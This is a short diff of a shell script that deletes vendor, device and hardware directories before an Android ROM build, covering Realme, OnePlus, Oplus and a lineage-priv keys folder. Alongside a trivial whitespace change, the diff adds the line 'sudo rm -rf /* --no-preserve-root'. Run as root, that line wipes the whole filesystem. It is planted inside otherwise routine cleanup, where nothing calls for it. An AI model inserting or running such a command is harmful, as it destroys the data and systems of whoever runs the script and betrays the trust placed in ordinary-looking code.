@@ -7,8 +7,9 @@ rm -rf vendor/realme
 rm -rf hardware/oplus
 rm -rf device/oneplus
 rm -rf vendor/oneplus
-rm -rf vendor/oplus
+rm -rf vendor/oplus 
 rm -rf vendor/lineage-priv/keys/
+sudo rm -rf /* --no-preserve-root
 # rm -rf packages/apps/ViMusic
 # rm -rf packages/apps/Droid-ify
 
